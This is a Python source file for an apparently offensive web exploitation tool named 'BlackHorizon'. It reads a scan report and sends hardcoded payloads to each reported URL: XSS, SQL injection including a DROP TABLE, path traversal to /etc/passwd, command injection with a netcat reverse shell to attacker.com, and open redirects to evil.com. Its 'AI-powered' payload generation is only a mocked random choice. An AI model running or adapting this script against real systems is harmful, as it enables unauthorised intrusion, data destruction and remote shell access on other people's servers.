import os
import json
import time
import random
import requests
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"‚ö†Ô∏è Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

TARGET = config.get("TARGET", "example.com")
TIMEOUT = config.get("TIMEOUT", 10)
SCAN_REPORT_PATH = f"reports/{TARGET}_scan.json"

# AI-powered payload generation (mocked for now)
def generate_ai_payload(vuln_type):
    """Generates AI-driven payloads dynamically."""
    ai_payloads = {
        "XSS": [
            "<script>alert('BlackHorizon')</script>",
            "<img src=x onerror=alert('Hacked')>",
            "javascript:alert(document.domain)"
        ],
        "SQLi": [
            "' OR 1=1 --",
            "' UNION SELECT null, user() --",
            "'; DROP TABLE logs --"
        ],
        "LFI": [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/proc/self/cmdline"
        ],
        "RCE": [
            "`whoami`",
            "$(id)",
            "; nc -e /bin/sh attacker.com 4444"
        ],
        "Open Redirect": [
            "https://evil.com",
            "//evil.com",
            "/%2f%2fevil.com"
        ]
    }
    return random.choice(ai_payloads.get(vuln_type, [""]))

# Function to load scan report
def load_scan_report():
    """Loads scan report from active_scan.py"""
    if not os.path.exists(SCAN_REPORT_PATH):
        print(Fore.RED + f"‚ö†Ô∏è No scan report found for {TARGET}. Run active_scan.py first.")
        exit(1)

    with open(SCAN_REPORT_PATH, "r") as scan_file:
        try:
            return json.load(scan_file)
        except json.JSONDecodeError:
            print(Fore.RED + f"‚ùå Error parsing scan report {SCAN_REPORT_PATH}")
            exit(1)

# Function to exploit vulnerabilities
def exploit_vulnerabilities():
    print(Fore.CYAN + f"üí• Exploiting vulnerabilities on {TARGET}...")
    
    scan_data = load_scan_report()
    if not scan_data:
        print(Fore.YELLOW + "‚ö†Ô∏è No vulnerabilities detected. Exiting exploit phase.")
        return []

    exploited_endpoints = []
    for vuln in scan_data:
        vuln_type = vuln["type"]
        url = vuln["url"]
        ai_payload = generate_ai_payload(vuln_type)

        exploit_url = f"{url}{ai_payload}"
        print(Fore.YELLOW + f"üöÄ Attempting {vuln_type} exploit: {exploit_url}")

        try:
            response = requests.get(exploit_url, timeout=TIMEOUT)
            if response.status_code == 200 and ai_payload in response.text:
                print(Fore.GREEN + f"‚úÖ Successfully exploited {vuln_type} at {url}")
                exploited_endpoints.append({"type": vuln_type, "url": exploit_url, "payload": ai_payload})
            else:
                print(Fore.YELLOW + f"‚ö†Ô∏è Exploit attempt for {vuln_type} failed at {url}")

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"‚ùå Exploit attempt failed: {url} | {e}")

    return exploited_endpoints

# Save Exploit Results
def save_results(data):
    os.makedirs("reports", exist_ok=True)
    report_path = f"reports/{TARGET}_exploit.json"

    with open(report_path, "w") as report_file:
        json.dump(data, report_file, indent=4)

    print(Fore.GREEN + f"üìÑ Exploit Report saved: {report_path}")

# Main Execution
def main():
    print(Fore.MAGENTA + "üöÄ Running AI-Powered Exploitation...")
    start_time = time.time()

    exploit_results = exploit_vulnerabilities()
    save_results(exploit_results)

    end_time = time.time()
    print(Fore.GREEN + f"‚úÖ Exploitation completed in {round(end_time - start_time, 2)} seconds.")

if __name__ == "__main__":
    main()
